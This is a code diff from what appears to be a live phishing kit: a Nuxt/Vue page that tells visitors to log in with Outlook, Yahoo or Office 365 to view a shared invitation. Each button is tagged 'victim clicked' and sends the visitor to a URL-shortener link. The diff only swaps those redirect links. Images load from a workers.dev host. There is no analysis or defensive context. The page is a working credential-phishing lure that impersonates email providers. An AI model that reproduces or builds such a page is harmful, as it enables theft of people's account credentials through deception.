@@ -6,7 +6,7 @@
                 <p>To read the invitation, please choose your email provider below login to view shared file.</p>
             </section>
             <section class="links">
-                    <button @click="finishJoob('victim clicked Outlook', 'https://2it.kr/YypV5')">
+                    <button @click="finishJoob('victim clicked Outlook', 'https://2it.kr/ghlVvp')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                         <p>Continue with Outlook</p>
                     </button>
@@ -18,13 +18,13 @@
                     </button>
                 </NuxtLink>
 
-                    <button @click="finishJoob('victim clicked Yahoo!', 'https://2it.kr/rQXI8Y')">
+                    <button @click="finishJoob('victim clicked Yahoo!', 'https://2it.kr/bMFW')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                         <p>Continue with Yahoo!</p>
                     </button>
 
 
-                    <button @click="finishJoob('victim clicked Office 365', 'https://2it.kr/YypV5')">
+                    <button @click="finishJoob('victim clicked Office 365', 'https://2it.kr/ghlVvp')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                         <p>Continue with Office 365</p>
                     </button>
